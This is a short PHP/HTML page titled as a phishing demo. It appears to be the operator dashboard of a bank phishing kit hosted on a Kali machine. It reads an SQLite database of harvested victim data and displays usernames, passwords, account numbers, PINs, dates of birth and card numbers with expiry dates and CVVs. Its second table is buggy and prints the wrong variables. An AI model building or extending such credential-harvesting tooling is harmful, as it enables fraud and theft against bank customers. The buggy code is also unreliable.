<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DEMO OF PHISHING MESSAGES</title>

    <style>
    table, th, td {
    border: 1px solid black;
    border-collapse: collapse;
    }
    </style>
</head>
<body>
    



<fieldset style="border: 1px black solid">
        <legend style="border: 1px black solid;margin-left: 1em; padding: 0.2em 0.8em ">USER DETAILS AFTER LOGIN</legend>


<?php
$db = new PDO("sqlite:/home/kali/wwwdata/mybankphish/home/fidelityusers.db");
if ($_SERVER["REQUEST_METHOD"] == "GET") {

// $sql = "INSERT INTO userdetails (username,password,account,phone,pin,dob) VALUES (?,?,?,?,?,?)";
// $stmt= $db->prepare($sql);
// $stmt->execute([$myUsername,$myPassword,$myAccount,$myPhone,$myPIN,$myDOB ]);


$sql = "SELECT * FROM userdetails";
$stmt= $db->query($sql);
$userdetails = $stmt->fetchAll(PDO::FETCH_ASSOC);


echo "<div class='row'>"
     . "<div>"
     . "<table>"
     . "<thead><tr><th>USERNAME</th><th>PASSWORD</th><th>ACCOUNT</th><th>PHONE</th><th>PIN</th><th>DOB</th></tr></thead><tbody>";

foreach($userdetails as $row=>$userdetail)
  {
      $username = $userdetail['username'];
      $password = $userdetail['password'];
      $account = $userdetail['account'];
      $phone = $userdetail['phone'];
      $pin = $userdetail['pin'];
      $dob = $userdetail['dob'];
  
          echo "<tr><td>".$username."</td><td>".$password."</td><td>".$account."</td><td>".$phone."</td><td>".$pin."</td><td>".$dob."</td></tr>";
               
        
      }
  
          echo "</tbody></table>"
               . "</div>"
               . "</div>";


}
?>
  </fieldset>
      <br />

      <br />
      <br />




      <fieldset style="border: 1px black solid">
        <legend style="border: 1px black solid;margin-left: 1em; padding: 0.2em 0.8em ">USER DETAILS AFTER LOGIN</legend>


<?php
// $db = new PDO("sqlite:/home/kali/wwwdata/mybankphish/home/fidelityusers.db");
if ($_SERVER["REQUEST_METHOD"] == "GET") {

// $sql = "INSERT INTO userdetails (username,password,account,phone,pin,dob) VALUES (?,?,?,?,?,?)";
// $stmt= $db->prepare($sql);
// $stmt->execute([$myUsername,$myPassword,$myAccount,$myPhone,$myPIN,$myDOB ]);


$sql = "SELECT * FROM cardupdate";
$stmt= $db->query($sql);
$cardupdates = $stmt->fetchAll(PDO::FETCH_ASSOC);


echo "<div class='row'>"
     . "<div>"
     . "<table>"
     . "<thead><tr><th>CUSTOMER NAME</th><th>Card Number (PAN)</th><th>EXPIRY DATE</th><th>CVV</th></tr></thead><tbody>";

foreach($cardupdates as $row=>$cardupdate)
  {
      $cname = $cardupdate['cname'];
      $account = $cardupdate['account'];
      $expiry = $cardupdate['expiry'];
      $cvv = $cardupdate['cvv'];
  
          echo "<tr><td>".$username."</td><td>".$password."</td><td>".$account."</td><td>".$phone."</td><td>".$pin."</td><td>".$dob."</td></tr>";
               
        
      }
  
          echo "</tbody></table>"
               . "</div>"
               . "</div>";


}
?>
  </fieldset>



</body>
</html>